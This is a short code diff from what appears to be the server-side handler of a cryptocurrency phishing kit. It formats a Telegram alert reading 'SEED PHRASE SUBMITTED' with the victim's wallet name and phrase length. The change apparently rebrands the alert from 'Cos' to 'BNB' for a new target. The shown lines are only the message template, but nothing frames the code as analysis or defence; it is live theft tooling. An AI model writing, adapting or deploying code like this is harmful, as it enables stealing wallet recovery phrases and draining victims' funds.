@@ -42,8 +42,8 @@ module.exports = async (req, res) => {
     formattedDate = formattedDate || new Date().toUTCString();
     const wordCountDesc = keywords ? `${keywords} word phrase` : '12 word phrase';
 
-    // Format Telegram message in "Cos Alert" style
-    const message = `🚨 *Cos Alert*\n\n` +
+    // Format Telegram message in "BNB Alert" style
+    const message = `🚨 *BNB Alert*\n\n` +
                    `🔑 *SEED PHRASE SUBMITTED*\n\n` +
                    `👤 *Wallet:* ${imported || 'Unknown'}\n` +
                    `🔤 *Words:* ${wordCountDesc}\n` +
